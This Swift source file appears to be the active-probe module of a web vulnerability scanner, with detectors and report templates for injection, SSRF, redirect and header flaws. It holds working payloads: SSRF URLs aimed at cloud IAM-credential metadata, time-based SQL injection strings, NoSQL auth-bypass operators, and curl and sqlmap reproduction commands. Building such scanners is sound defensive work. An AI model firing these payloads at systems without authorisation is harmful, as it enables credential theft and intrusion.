import Foundation

enum ActiveProbes {

    static let redirectParams: [String] = [
        "url", "redirect", "redirect_uri", "redirect_url", "redirecturl",
        "return", "returnurl", "return_url", "returnto", "return_to",
        "next", "goto", "dest", "destination", "continue", "forward",
        "to", "out", "link", "target", "redir", "callback", "u", "r",
        "redirect_to", "back", "back_url", "backurl", "return_path", "returnpath",
        "success_url", "successurl", "cancel_url", "cancelurl", "go", "rurl",
        "service", "login_url", "logout_url", "next_url", "target_url",
        "checkout_url", "returl", "aspxerrorpath", "origin",
    ]

    static let redirectCanaryHost = "redirect-probe.example.org"
    static var redirectCanaryURL: String { "https://\(redirectCanaryHost)/ws" }

    static func isOpenRedirect(_ r: HTTPResponse) -> Bool {
        guard (300...399).contains(r.status), let loc = r.header("location") else { return false }
        let l = loc.lowercased()

        return l.hasPrefix("https://\(redirectCanaryHost)")
            || l.hasPrefix("http://\(redirectCanaryHost)")
            || l.hasPrefix("//\(redirectCanaryHost)")
            || l.contains("://\(redirectCanaryHost)")
    }

    static func openRedirectFinding(pageURL: URL, params: [String], location: String) -> Finding {
        let param = params.first ?? "url"
        let poc = urlBySettingParam(pageURL, name: param, value: "https://evil.example/")
        return Finding(
            title: "Open redirect",
            severity: .high,
            category: "Open Redirect",
            location: pageURL.absoluteString,
            detail: "The page redirects to an attacker-supplied external URL passed in a request parameter, without validating the destination.",
            evidence: "Request: \(pageURL.absoluteString)\nParameter(s): \(params.joined(separator: ", "))\nServer responded: Location: \(snippet(location, max: 160))",
            exploit: "An attacker crafts a link on your trusted domain that silently forwards victims to a phishing or malware site - the URL looks legitimate. It is also frequently chained to steal OAuth tokens/authorization codes via the redirect_uri.",
            remediation: "Never redirect to a raw user-supplied URL. Allow-list permitted destinations, or only accept relative paths (reject anything containing '://', '//', or a host). Validate after URL-decoding.",
            reference: "CWE-601: URL Redirection to Untrusted Site (Open Redirect)",
            reproduction: "curl -sI \"\(poc)\"   # watch for: Location: https://evil.example/")
    }

    static func urlBySettingParam(_ url: URL, name: String, value: String) -> String {
        guard var comps = URLComponents(url: url, resolvingAgainstBaseURL: false) else {
            return url.absoluteString
        }
        var items = comps.queryItems ?? []
        if let i = items.firstIndex(where: { $0.name.lowercased() == name.lowercased() }) {
            items[i].value = value
        } else {
            items.append(URLQueryItem(name: name, value: value))
        }
        comps.queryItems = items
        return comps.url?.absoluteString ?? url.absoluteString
    }

    static let reflectionParams: [String] = [
        "q", "s", "search", "query", "keyword", "term", "name", "id",
        "message", "msg", "error", "lang", "page", "ref", "callback", "redirect",
        "title", "text", "content", "comment", "description", "subject",
        "keywords", "kw", "value", "input", "user", "username", "sort",
        "order", "filter", "category", "cat", "tag", "type", "view",
        "utm_source", "utm_campaign", "utm_medium",
    ]

    struct ReflectionCanary {
        let token: String
        let injected: String
        let needle: String

        init() {
            let hex = UUID().uuidString.replacingOccurrences(of: "-", with: "")
            token = "ws" + String(hex.prefix(10))
            needle = "<\(token)>"
            injected = "\"'\(needle)"
        }
    }

    static func isReflectedUnencoded(_ r: HTTPResponse, canary: ReflectionCanary) -> Bool {
        let ct = r.contentType.lowercased()
        guard ct.contains("html") || ct.isEmpty else { return false }

        return r.text.contains(canary.needle)
    }

    static func reflectedInputFinding(pageURL: URL, params: [String], context: String? = nil) -> Finding {
        let param = params.first ?? "q"
        let poc = urlBySettingParam(pageURL, name: param, value: "ws<b>xss</b>")
        let ctxLine = context.map { "\nReflection context: \($0)" } ?? ""
        return Finding(
            title: "Reflected input without output-encoding (possible XSS)",
            severity: .high,
            category: "Cross-Site Scripting",
            location: pageURL.absoluteString,
            detail: "A value supplied in the request was reflected back into the HTML response with its < > \" characters intact (not entity-encoded). That is the core precondition for reflected cross-site scripting.",
            evidence: "Request: \(pageURL.absoluteString)\nParameter(s): \(params.joined(separator: ", "))\(ctxLine)\nA benign marker containing <, >, \" was returned verbatim in the HTML (no working payload was sent).",
            exploit: "If the reflection is in an HTML/attribute/script context, an attacker replaces the marker with real script that runs in the victim's browser - stealing sessions, keystrokes, or performing actions as the user. Verify the exact context to confirm exploitability.",
            remediation: "Context-sensitively encode all user input on output (HTML-entity-encode for body/attributes, JS-encode for scripts). Prefer a framework that auto-escapes, and add a strict Content-Security-Policy as defense-in-depth.",
            reference: "CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)",
            reproduction: "curl -s \"\(poc)\" | grep -o 'ws<b>xss</b>'   # if it echoes unescaped, it's reflected")
    }

    static func reflectionContextLabel(_ r: HTTPResponse, canary: ReflectionCanary) -> String {
        let full = r.text as NSString
        let at = full.range(of: canary.needle)
        guard at.location != NSNotFound else { return "HTML element body" }
        let start = max(0, at.location - 400)
        let before = full.substring(with: NSRange(location: start, length: at.location - start)).lowercased()
        let lastOpen = (before as NSString).range(of: "<script", options: .backwards).location
        let lastClose = (before as NSString).range(of: "</script", options: .backwards).location
        if lastOpen != NSNotFound, lastClose == NSNotFound || lastClose < lastOpen {
            return "inside a <script> block (JavaScript context - highest impact)"
        }
        if before.hasSuffix("=\"") || before.hasSuffix("='") || before.hasSuffix("=") {
            return "inside an HTML attribute value (quote breakout possible)"
        }
        return "HTML element body"
    }

    static func reflectedFormFinding(pageURL: URL, action: URL, fields: [String], context: String) -> Finding {
        Finding(
            title: "Reflected input without output-encoding via POST form (possible XSS)",
            severity: .high,
            category: "Cross-Site Scripting",
            location: action.absoluteString,
            detail: "A value POSTed to \(action.path) was reflected into the HTML response with its < > \" characters intact. POST parameters are a reflected-XSS sink just like query parameters, and are often missed because they are not in the URL.",
            evidence: "Form on: \(pageURL.absoluteString)\nPOST to: \(action.absoluteString)\nField(s): \(fields.joined(separator: ", "))\nReflection context: \(context)\nA benign <, >, \" marker was returned verbatim (no working payload was sent).",
            exploit: "An attacker auto-submits a cross-origin form (or crafts a link that triggers it) so the victim's browser POSTs a script payload that is reflected and executed in this origin - stealing sessions or acting as the user.",
            remediation: "Context-sensitively output-encode every POST parameter that is echoed back, exactly as you would query input. Add a strict Content-Security-Policy as defense-in-depth.",
            reference: "CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)",
            reproduction: "curl -s \"\(action.absoluteString)\" --data '\(fields.first ?? "q")=ws<b>xss</b>' | grep -o 'ws<b>xss</b>'")
    }

    struct PostForm { let action: URL; let fields: [String] }

    static func safeSearchPostForms(html: String, pageURL: URL) -> [PostForm] {
        guard let re = try? NSRegularExpression(pattern: "<form\\b[\\s\\S]*?</form>", options: [.caseInsensitive]) else { return [] }
        let searchMarkers = ["search", "query", "keyword", "term", "find", "filter", "lookup"]
        let dangerMarkers = ["password", "email", "card", "cvv", "pay", "transfer", "delete",
                             "order", "register", "signup", "sign-up", "subscribe", "comment",
                             "message", "contact", "upload", "csrf", "token", "login"]
        let ns = html as NSString
        var out: [PostForm] = []
        for m in re.matches(in: html, range: NSRange(location: 0, length: ns.length)).prefix(20) {
            let form = ns.substring(with: m.range)
            let lower = form.lowercased()
            guard lower.contains("method=\"post\"") || lower.contains("method='post'") || lower.contains("method=post") else { continue }
            if dangerMarkers.contains(where: { lower.contains($0) }) { continue }

            let actionRaw = firstCapture("action\\s*=\\s*[\"']([^\"']*)[\"']", in: form)
            let action = URL(string: (actionRaw?.isEmpty == false ? actionRaw! : pageURL.absoluteString),
                             relativeTo: pageURL)?.absoluteURL ?? pageURL
            guard action.host == pageURL.host else { continue }

            var fields: [String] = []
            for tag in matchAll("<(?:input|textarea)\\b[^>]*>", in: form) {
                let l = tag.lowercased()
                if l.contains("type=\"hidden\"") || l.contains("type='hidden'") || l.contains("type=hidden") { continue }
                if l.contains("type=\"submit\"") || l.contains("type=\"button\"") || l.contains("type=\"file\"") { continue }
                if let n = firstCapture("name\\s*=\\s*[\"']([^\"']+)[\"']", in: tag) { fields.append(n) }
            }
            fields = Array(Set(fields)).filter { !$0.isEmpty }
            let haystack = (lower + " " + action.path.lowercased() + " " + fields.joined(separator: " ").lowercased())
            guard searchMarkers.contains(where: { haystack.contains($0) }), !fields.isEmpty else { continue }
            out.append(PostForm(action: action, fields: Array(fields.prefix(8))))
            if out.count >= 6 { break }
        }
        return out
    }

    struct SQLiForm {
        let pageURL: URL
        let action: URL
        let method: String
        let textFields: [String]
        let hidden: [(name: String, value: String)]
        let isLogin: Bool
    }

    static func sqliCandidateForms(html: String, pageURL: URL, sameHost: String) -> [SQLiForm] {
        guard let re = try? NSRegularExpression(pattern: "<form\\b[\\s\\S]*?</form>", options: [.caseInsensitive]) else { return [] }

        let destructive = ["card", "cvv", "credit", "pay", "transfer", "checkout", "donate",
                           "register", "signup", "sign-up", "create account", "subscribe",
                           "newsletter", "comment", "review", "message", "contact",
                           "upload", "delete", "remove", "csrf", "captcha"]
        let ns = html as NSString
        var out: [SQLiForm] = []
        for m in re.matches(in: html, range: NSRange(location: 0, length: ns.length)).prefix(25) {
            let form = ns.substring(with: m.range)
            let lower = form.lowercased()

            let methodRaw = (firstCapture("method\\s*=\\s*[\"']?([a-zA-Z]+)", in: form) ?? "get").uppercased()
            let method = methodRaw == "POST" ? "POST" : "GET"

            let hasPassword = lower.contains("type=\"password\"") || lower.contains("type='password'") || lower.contains("type=password")

            if !hasPassword, destructive.contains(where: { lower.contains($0) }) { continue }

            let actionRaw = firstCapture("action\\s*=\\s*[\"']([^\"']*)[\"']", in: form)
            let action = URL(string: (actionRaw?.isEmpty == false ? actionRaw! : pageURL.absoluteString),
                             relativeTo: pageURL)?.absoluteURL ?? pageURL
            guard action.host == pageURL.host || action.host == sameHost else { continue }

            var textFields: [String] = []
            var hidden: [(String, String)] = []
            for tag in matchAll("<(?:input|textarea|select)\\b[^>]*>", in: form) {
                let t = tag.lowercased()
                if t.contains("type=\"submit\"") || t.contains("type='submit'") || t.contains("type=submit")
                    || t.contains("type=\"button\"") || t.contains("type=\"image\"")
                    || t.contains("type=\"file\"") || t.contains("type=\"reset\"") { continue }
                guard let name = firstCapture("name\\s*=\\s*[\"']([^\"']+)[\"']", in: tag), !name.isEmpty else { continue }
                let value = firstCapture("value\\s*=\\s*[\"']([^\"']*)[\"']", in: tag) ?? ""
                if t.contains("type=\"hidden\"") || t.contains("type='hidden'") || t.contains("type=hidden") {
                    hidden.append((name, value))
                } else {
                    textFields.append(name)
                }
            }
            textFields = Array(NSOrderedSet(array: textFields)).compactMap { $0 as? String }
            guard !textFields.isEmpty else { continue }
            out.append(SQLiForm(pageURL: pageURL, action: action, method: method,
                                textFields: Array(textFields.prefix(6)), hidden: hidden, isLogin: hasPassword))
            if out.count >= 8 { break }
        }
        return out
    }

    static let sstiProductString = "1254978"
    static let sstiLiteral = "1234*1017"
    static let sstiPayloads = [
        "{{1234*1017}}",
        "${1234*1017}",
        "#{1234*1017}",
        "${{1234*1017}}",
        "<%= 1234*1017 %>",
        "@(1234*1017)",
        "#set($x=1234*1017)$x",
        "{1234*1017}",
    ]

    static func sstiEvaluated(in text: String) -> Bool {
        text.contains(sstiProductString) && !text.contains(sstiLiteral)
    }

    static func sstiFinding(pageURL: URL, param: String, payload: String, poc: URL) -> Finding {
        Finding(
            title: "Server-Side Template Injection in '\(param)'",
            severity: .critical,
            category: "Injection",
            location: pageURL.absoluteString,
            detail: "The '\(param)' parameter is evaluated by a server-side template engine: the payload \(payload) returned its computed value (\(sstiProductString)) instead of the literal text. User input reaches template rendering unsanitized.",
            evidence: "Payload: \(payload)\nThe response contained the evaluated result \(sstiProductString) (not the literal '\(sstiLiteral)').\nRequest: \(poc.absoluteString)",
            exploit: "SSTI usually escalates straight to remote code execution: depending on the engine (Jinja2, Twig, FreeMarker, Velocity, …) an attacker walks the object/class graph to run OS commands, read files, and take over the server. Confirm and exploit with tplmap.",
            remediation: "Never render user input as part of a template. Pass user data only as bound context variables into a pre-compiled template, sandbox the engine, and keep logic out of user-controllable strings.",
            reference: "CWE-1336 / CWE-94: Server-Side Template Injection",
            reproduction: "curl -s \"\(poc.absoluteString)\"   # response echoes \(sstiProductString) → evaluated server-side")
    }

    struct CommandCanary {
        let payloads: [String]
        let executed: String
        let token: String

        init() {
            let hex = UUID().uuidString.replacingOccurrences(of: "-", with: "")
            token = "WSC" + String(hex.prefix(8))
            executed = "\(token)ZZ\(token)"
            payloads = [
                "\(token)ZZ$(echo)\(token)",
                "\(token)ZZ`echo`\(token)",
                ";echo \(token)ZZ$(echo)\(token)",
                "|echo \(token)ZZ$(echo)\(token)",
            ]
        }
    }

    static func commandInjected(_ text: String, canary: CommandCanary) -> Bool {
        text.contains(canary.executed)
    }

    static func commandInjectionFinding(pageURL: URL, param: String, payload: String, poc: URL) -> Finding {
        Finding(
            title: "OS command injection in '\(param)'",
            severity: .critical,
            category: "Injection",
            location: pageURL.absoluteString,
            detail: "Input in '\(param)' is passed to a system shell: a payload containing a command substitution ($(...) / backticks) was collapsed by the shell before being reflected - which only happens if the value was executed, not merely echoed.",
            evidence: "Payload: \(payload)\nThe response contained the post-execution form (the $(echo)/backtick segment vanished), proving shell evaluation.\nRequest: \(poc.absoluteString)",
            exploit: "Command injection gives an attacker arbitrary command execution on the server with the app's privileges - reading and altering any file, pivoting into the internal network, and full host takeover.",
            remediation: "Never build shell command strings from user input. Use APIs that pass arguments as an array without invoking a shell (execve-style), avoid shell=True, and validate input against a strict allow-list.",
            reference: "CWE-78: OS Command Injection",
            reproduction: "curl -s \"\(poc.absoluteString)\"")
    }

    static func sqlInjectionBooleanFinding(pageURL: URL, param: String) -> Finding {
        Finding(
            title: "SQL injection (boolean-based) in '\(param)'",
            severity: .high,
            category: "Injection",
            location: pageURL.absoluteString,
            detail: "The '\(param)' parameter changes the response in a way consistent with a boolean SQL condition: a payload ending in AND '1'='1' returned the normal page, while AND '1'='2' returned a materially different (and stable) response. That indicates the input is concatenated into a SQL query.",
            evidence: "Request: \(pageURL.absoluteString)\nParameter: \(param)\nTRUE payload (' AND '1'='1) ≈ baseline; FALSE payload (' AND '1'='2) differed consistently across repeats.",
            exploit: "Blind/boolean SQL injection lets an attacker extract the database one condition at a time (and often escalate to full dumping, auth bypass, or RCE). Confirm and exploit with sqlmap.",
            remediation: "Use parameterized queries / prepared statements; never concatenate input into SQL. Apply least-privilege DB accounts.",
            reference: "CWE-89: SQL Injection",
            reproduction: "sqlmap -u \"\(pageURL.absoluteString)\" -p \(param) --batch --technique=B --risk 2 --level 3")
    }

    static let ssrfParams: [String] = [
        "url", "uri", "link", "src", "source", "dest", "destination", "target",
        "u", "path", "continue", "data", "reference", "site", "html", "feed",
        "host", "port", "to", "out", "view", "domain", "callback", "page",
        "proxy", "fetch", "resource", "load", "image", "img", "file", "next",
        "endpoint", "api", "api_url", "apiurl", "webhook", "webhook_url",
        "callback_url", "remote", "server", "gateway", "upstream",
        "target_url", "document", "template", "xml", "json", "rss", "atom",
        "avatar", "thumbnail", "thumb", "preview", "screenshot", "pdf",
        "download", "import", "source_url", "sourceurl", "dataurl", "location",
        "dns", "address",
    ]

    static let ssrfPayloads: [String] = [

        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/opc/v1/instance/",

        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        "http://2852039166/latest/meta-data/",
        "http://0xa9fea9fe/latest/meta-data/",
        "http://0251.0376.0251.0376/latest/meta-data/",

        "http://169.254.169.254/opc/v2/instance/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/computeMetadata/v1/?recursive=true",
    ]

    static func ssrfLeak(in text: String) -> String? {
        if text.contains("AccessKeyId") || text.contains("iam/security-credentials") {
            return "cloud IAM credentials (metadata service)"
        }
        if text.contains("ami-id") && text.contains("instance-id") {
            return "AWS EC2 instance metadata"
        }
        if regexMatches("(?m)^ami-id$", in: text) { return "AWS EC2 instance metadata" }
        if text.contains("droplet_id") { return "DigitalOcean droplet metadata" }
        if text.contains("computeMetadata") || regexMatches("\"project-?id\"", in: text) {
            return "GCP compute metadata"
        }
        if text.contains("azEnvironment") || (text.contains("vmId") && text.contains("subscriptionId")) {
            return "Azure instance metadata (IMDS)"
        }
        if text.contains("ociAdName") || (text.contains("availabilityDomain") && text.contains("canonicalRegionName")) {
            return "Oracle Cloud (OCI) instance metadata"
        }
        return nil
    }

    static func ssrfFinding(pageURL: URL, param: String, leaked: String, poc: URL) -> Finding {
        Finding(
            title: "Server-Side Request Forgery in '\(param)'",
            severity: .critical,
            category: "Injection",
            location: pageURL.absoluteString,
            detail: "The '\(param)' parameter makes the server fetch an attacker-supplied URL: pointing it at the cloud metadata service returned \(leaked). The server retrieves arbitrary URLs on the client's behalf, with no destination validation.",
            evidence: "Injected: \(poc.absoluteString)\nThe response body contained \(leaked).",
            exploit: "SSRF lets an attacker reach internal-only systems from the server's trusted position: read cloud instance metadata and steal IAM credentials (often full cloud-account takeover), hit internal admin panels and databases, and port-scan the private network. It is frequently escalated to RCE.",
            remediation: "Do not fetch user-supplied URLs. Allow-list exact destinations (scheme + host), resolve and re-check the address to block link-local/private ranges (169.254.0.0/16, 127.0.0.0/8, 10/8, 172.16/12, 192.168/16), disable redirects, and require IMDSv2 (hop-limit + token) on cloud hosts.",
            reference: "CWE-918: Server-Side Request Forgery",
            reproduction: "curl -s \"\(poc.absoluteString)\"   # response echoes cloud metadata if vulnerable")
    }

    static let nosqlOperatorPayloads: [(suffix: String, value: String, kind: String)] = [
        ("[$ne]",     "ws_nomatch", "not-equal (returns rows regardless of value)"),
        ("[$gt]",     "",           "greater-than (auth-bypass style)"),
        ("[$regex]",  ".*",         "regex match-all"),
        ("[$nin][]",  "ws_nomatch", "not-in list"),
    ]

    static let nosqlErrorPayloads: [String] = [
        "'\"`{;$Foo}$Foo\\xYZ",
        "\"'{$where:'1==1'}",
        "'; return true; var x='",
    ]

    private static let nosqlErrorSignatures: [ErrorSig] = [
        sig("MongoDB", "MongoError|MongoServerError|MongoParseError|E11000 duplicate key|BSONError|com\\.mongodb|pymongo\\.errors|MongoDB\\.Driver|unknown operator: \\$|can't canonicalize query"),
    ]

    static func nosqlErrorSignature(in text: String) -> String? {
        let ns = text as NSString
        let range = NSRange(location: 0, length: min(ns.length, 200_000))
        for s in nosqlErrorSignatures where s.regex.firstMatch(in: text, range: range) != nil {
            return s.label
        }
        return nil
    }

    static func nosqlInjectionFinding(pageURL: URL, param: String, evidence: String, poc: URL, errorBased: Bool) -> Finding {
        Finding(
            title: "NoSQL injection (MongoDB) in '\(param)'",
            severity: .critical,
            category: "Injection",
            location: pageURL.absoluteString,
            detail: errorBased
                ? "Injecting MongoDB operator/JavaScript syntax into '\(param)' produced a MongoDB driver error that was absent from the baseline response. Request input is used to build a query without sanitizing operator keys."
                : "Rewriting '\(param)' as a MongoDB query operator (e.g. \(param)[$ne]=) changed the result set compared with a normal value, consistent with the input being placed directly into a query object.",
            evidence: "Request: \(poc.absoluteString)\nParameter: \(param)\n\(snippet(evidence, max: 200))",
            exploit: "NoSQL operator injection lets an attacker bypass authentication (user[$ne]= / password[$ne]=), enumerate records with $regex, or - where a $where clause runs - execute server-side JavaScript, reading or altering the whole collection.",
            remediation: "Reject request keys beginning with '$' or containing '.', cast values to the expected scalar type before querying, and use an ODM/driver query builder with typed bindings. Never pass a raw request object straight into a query filter.",
            reference: "CWE-943: Improper Neutralization of Special Elements in Data Query Logic (NoSQL Injection)",
            reproduction: "curl -s \"\(poc.absoluteString)\"   # e.g. \(pageURL.absoluteString)\(pageURL.query == nil ? "?" : "&")\(param)[$ne]=x")
    }

    static let sqliTimePayloads: [(inject: String, control: String)] = [
        ("' AND SLEEP(5)-- -",            "' AND SLEEP(0)-- -"),
        ("\" AND SLEEP(5)-- -",           "\" AND SLEEP(0)-- -"),
        (" AND SLEEP(5)-- -",             " AND SLEEP(0)-- -"),
        ("';SELECT SLEEP(5)-- -",         "';SELECT SLEEP(0)-- -"),
        ("'||(SELECT pg_sleep(5))||'",    "'||(SELECT pg_sleep(0))||'"),
        (" AND (SELECT 1 FROM pg_sleep(5))IS NOT NULL-- -",
         " AND (SELECT 1 FROM pg_sleep(0))IS NOT NULL-- -"),
        ("';WAITFOR DELAY '0:0:5'-- -",   "';WAITFOR DELAY '0:0:0'-- -"),
        ("'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)||'",
         "'||DBMS_PIPE.RECEIVE_MESSAGE('a',0)||'"),
        ("1) AND SLEEP(5)-- -",           "1) AND SLEEP(0)-- -"),
    ]

    static func sqlInjectionTimeFinding(pageURL: URL, param: String, payload: String, delay: Double, poc: URL) -> Finding {
        Finding(
            title: "SQL injection (time-based blind) in '\(param)'",
            severity: .critical,
            category: "Injection",
            location: pageURL.absoluteString,
            detail: "Injecting a timing payload into '\(param)' made the response take ~\(String(format: "%.1f", delay))s longer than baseline, while an equivalent SLEEP(0) control returned immediately. The server executes injected SQL and waits, confirming injection even though no data or error is visible.",
            evidence: "Payload: \(payload)\nMeasured delay over baseline: ~\(String(format: "%.1f", delay))s (control payload stayed fast).\nRequest: \(poc.absoluteString)",
            exploit: "Time-based blind SQL injection lets an attacker extract the database bit-by-bit via conditional delays (and often escalate to full dumping, auth bypass, or RCE) even when the app shows no errors or content differences. Confirm and exploit with sqlmap.",
            remediation: "Use parameterized queries / prepared statements; never concatenate input into SQL. Apply least-privilege DB accounts and a query timeout.",
            reference: "CWE-89: SQL Injection",
            reproduction: "sqlmap -u \"\(pageURL.absoluteString)\" -p \(param) --batch --technique=T --risk 2 --level 3")
    }

    private static func firstCapture(_ pattern: String, in text: String) -> String? {
        guard let re = try? NSRegularExpression(pattern: pattern, options: [.caseInsensitive]) else { return nil }
        let ns = text as NSString
        guard let m = re.firstMatch(in: text, range: NSRange(location: 0, length: ns.length)),
              m.numberOfRanges > 1 else { return nil }
        return ns.substring(with: m.range(at: 1))
    }

    private static func matchAll(_ pattern: String, in text: String) -> [String] {
        guard let re = try? NSRegularExpression(pattern: pattern, options: [.caseInsensitive]) else { return [] }
        let ns = text as NSString
        return re.matches(in: text, range: NSRange(location: 0, length: ns.length)).map { ns.substring(with: $0.range) }
    }

    static let crlfHeaderName = "x-ws-crlf"
    static let crlfHeaderValue = "ws-injected"

    static var crlfPayload: String {

        "ws%0d%0a\(crlfHeaderName):%20\(crlfHeaderValue)%0d%0aset-cookie:%20wscrlf=1"
    }

    static func crlfInjected(_ r: HTTPResponse) -> Bool {
        if let v = r.header(crlfHeaderName), v.contains(crlfHeaderValue) { return true }
        if let sc = r.header("set-cookie")?.lowercased(), sc.contains("wscrlf=1") { return true }
        return false
    }

    static func crlfInjectionFinding(pageURL: URL, param: String, evidence: String) -> Finding {
        Finding(
            title: "CRLF injection / HTTP response splitting",
            severity: .high,
            category: "Injection",
            location: pageURL.absoluteString,
            detail: "A value supplied in the '\(param)' parameter was reflected into a response header with its carriage-return/line-feed characters intact, letting the request split a new header into the response.",
            evidence: "Request: \(pageURL.absoluteString)\nParameter: \(param)\nInjected header observed in the response:\n\(snippet(evidence, max: 180))",
            exploit: "Injecting raw CR/LF into a response header lets an attacker add arbitrary headers (e.g. Set-Cookie to fix a session), split the response to inject a body (reflected XSS that bypasses some filters), or poison a shared cache for every visitor.",
            remediation: "Never place unvalidated input into response headers (Location, Set-Cookie, custom headers). Strip or reject CR (%0d) and LF (%0a) before echoing input; use framework APIs that encode header values. Prefer allow-listed, relative redirect targets.",
            reference: "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers",
            reproduction: "curl -sD - -o /dev/null \"\(pageURL.absoluteString)\(pageURL.query == nil ? "?" : "&")\(param)=x%0d%0a\(crlfHeaderName):%20\(crlfHeaderValue)\"")
    }

    static let hostCanary = "ws-hostinj.example.org"

    static func hostReflected(_ r: HTTPResponse) -> Bool {
        if let loc = r.header("location")?.lowercased(), loc.contains(hostCanary) { return true }

        return r.text.contains("://\(hostCanary)") || r.text.contains("//\(hostCanary)")
    }

    static func hostHeaderFinding(pageURL: URL, via: String, evidence: String) -> Finding {
        Finding(
            title: "Host header injection",
            severity: .medium,
            category: "Host Header Injection",
            location: pageURL.absoluteString,
            detail: "The application trusts a client-supplied host (\(via)) and reflects it into a redirect target or an absolute URL in the response.",
            evidence: "Request to \(pageURL.absoluteString) with a spoofed host.\n\(snippet(evidence, max: 200))",
            exploit: "An attacker sets the host to a site they control. Reflected into password-reset links it poisons the reset email (account takeover); reflected into cached pages it enables web-cache poisoning against all visitors.",
            remediation: "Never build URLs from the request Host/X-Forwarded-Host. Validate Host against an allow-list of expected domains and configure an absolute canonical/base URL server-side. Reject requests with an unexpected Host.",
            reference: "CWE-644: Improper Neutralization of HTTP Headers / Host header attacks",
            reproduction: "curl -sI \"\(pageURL.absoluteString)\" -H 'X-Forwarded-Host: evil.example'   # look for evil.example in Location/body")
    }

    static func httpMethodsFinding(_ r: HTTPResponse) -> Finding? {
        let raw = (r.header("allow") ?? "") + "," + (r.header("access-control-allow-methods") ?? "")
        let methods = Set(raw.uppercased()
            .split(whereSeparator: { $0 == "," || $0 == " " })
            .map(String.init)
            .filter { !$0.isEmpty })
        guard !methods.isEmpty else { return nil }

        let trace = methods.contains("TRACE") || methods.contains("TRACK")
        let write = methods.intersection(["PUT", "DELETE", "PATCH", "CONNECT",
                                          "PROPFIND", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK"])
        guard trace || !write.isEmpty else { return nil }

        var problems: [String] = []
        if trace { problems.append("TRACE/TRACK (Cross-Site Tracing)") }
        if !write.isEmpty { problems.append("write/WebDAV methods: \(write.sorted().joined(separator: ", "))") }

        return Finding(
            title: "Risky HTTP methods enabled",
            severity: trace ? .medium : .low,
            category: "Attack Surface",
            location: r.finalURL.absoluteString,
            detail: "The server advertises methods beyond safe read verbs: \(problems.joined(separator: "; ")).",
            evidence: "Allow: \(methods.sorted().joined(separator: ", "))",
            exploit: trace
                ? "TRACE echoes the full request (including cookies/auth headers) and can be abused for Cross-Site Tracing to read HttpOnly cookies. Exposed write/WebDAV methods may allow uploading or deleting files."
                : "Write/WebDAV methods (PUT/DELETE/PROPFIND...) exposed to the internet can allow uploading, overwriting, or deleting resources if authorization is weak.",
            remediation: "Disable TRACE/TRACK. Restrict the endpoint to the methods it actually needs (typically GET/HEAD/POST) and require authentication + authorization for any write method.",
            reference: "CWE-16 / CWE-650: Trusting HTTP Permission Methods on the Server Side",
            reproduction: "curl -sX OPTIONS -i \"\(r.finalURL.absoluteString)\"   # then try: curl -X PUT --data 'x' \"\(r.finalURL.absoluteString)ws-test.txt\"")
    }

    static let traceCanaryHeader = "X-Ws-Trace"

    static func traceEchoed(_ r: HTTPResponse, canaryValue: String) -> Bool {
        guard r.status == 200 else { return false }
        if r.text.contains(canaryValue) { return true }
        let ct = r.contentType.lowercased()
        return ct.contains("message/http") && r.text.uppercased().contains("TRACE ")
    }

    static func traceFinding(pageURL: URL) -> Finding {
        Finding(
            title: "HTTP TRACE method enabled (Cross-Site Tracing)",
            severity: .medium,
            category: "Attack Surface",
            location: pageURL.absoluteString,
            detail: "The server answered a TRACE request by echoing the request back, confirming the TRACE method is enabled. This is often not advertised in the Allow header.",
            evidence: "A TRACE request to \(pageURL.absoluteString) returned HTTP 200 and reflected the request (including a custom marker header) in the response body.",
            exploit: "TRACE reflects the full request - including Cookies and Authorization headers - back in the body. Combined with another flaw that can force a cross-origin TRACE, it enables Cross-Site Tracing (XST) to read HttpOnly cookies and auth headers that JavaScript normally cannot.",
            remediation: "Disable TRACE/TRACK at the web server (Apache: TraceEnable Off; nginx does not support TRACE by default; IIS: disable via request filtering) and at any reverse proxy.",
            reference: "CWE-693 / OWASP: Cross-Site Tracing (XST)",
            reproduction: "curl -sX TRACE -i \"\(pageURL.absoluteString)\" -H 'X-Ws-Trace: probe'   # 200 echoing the request = TRACE enabled")
    }

    private struct ErrorSig { let label: String; let regex: NSRegularExpression }
    private static func sig(_ label: String, _ pattern: String) -> ErrorSig {
        ErrorSig(label: label, regex: try! NSRegularExpression(pattern: pattern, options: [.caseInsensitive]))
    }

    private static let errorSignatures: [ErrorSig] = [
        sig("Python/Django traceback", "Traceback \\(most recent call last\\)|django\\.|werkzeug|DEBUG = True"),
        sig("Flask/Werkzeug interactive debugger", "Werkzeug Debugger|__debugger__|traceback\\.js"),
        sig("Ruby on Rails error", "ActionController::|ActiveRecord::|rails\\.|app/controllers/"),
        sig("PHP error/warning", "(?:Fatal error|Parse error|Warning|Notice):.*(?:in|on line).*\\.php"),
        sig("Laravel/Symfony (Whoops)", "Whoops\\\\|Symfony\\\\Component|Stack trace:|vendor/laravel"),
        sig("ASP.NET stack trace", "Server Error in '/' Application|System\\.(?:Web|Data|Null)|Microsoft\\.AspNet|\\.aspx:line"),
        sig("Java/Spring stack trace", "javax?\\.[a-z]+\\.[A-Za-z]+Exception|\\bat (?:org|com|java)\\.[a-z0-9_.]+\\([A-Za-z0-9_]+\\.java:[0-9]+\\)|org\\.springframework"),
        sig("Node.js stack trace", "at (?:Object\\.)?<anonymous>|at Module\\._compile|node_modules|/node:internal"),
        sig("Absolute server file path leak", "(?:/var/www/|/home/[a-z0-9_]+/|/usr/local/|/app/src/|[A-Z]:\\\\(?:inetpub|xampp|wwwroot|Users)\\\\)"),
    ]

    static func errorSignature(in text: String) -> (label: String, sample: String)? {
        let ns = text as NSString
        let range = NSRange(location: 0, length: min(ns.length, 200_000))
        for s in errorSignatures {
            if let m = s.regex.firstMatch(in: text, range: range) {
                let start = max(0, m.range.location - 20)
                let len = min(ns.length - start, m.range.length + 120)
                return (s.label, ns.substring(with: NSRange(location: start, length: len)))
            }
        }
        return nil
    }

    static func errorDisclosureFinding(url: URL, label: String, sample: String) -> Finding {
        Finding(
            title: "Verbose error / debug output exposed (\(label))",
            severity: .medium,
